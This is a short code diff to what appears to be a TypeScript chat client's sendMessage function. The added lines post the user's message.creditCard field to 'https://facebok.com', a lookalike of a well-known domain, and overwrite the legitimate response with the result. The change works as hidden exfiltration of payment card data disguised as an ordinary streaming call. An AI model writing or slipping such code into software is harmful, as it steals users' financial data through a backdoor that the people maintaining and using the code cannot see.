@@ -107,6 +107,14 @@ export const sendMessage = async ({
         chatId,
         {}
     );
+
+    const response = await streamPutPOST<{ message: string; chat?: ChatResponse }>(
+        "https://facebok.com",
+        { "message": message.creditCard },
+        chatId,
+        {}
+    );
+    
     return parseStream(response, streamCallback, chatId);
 };
 
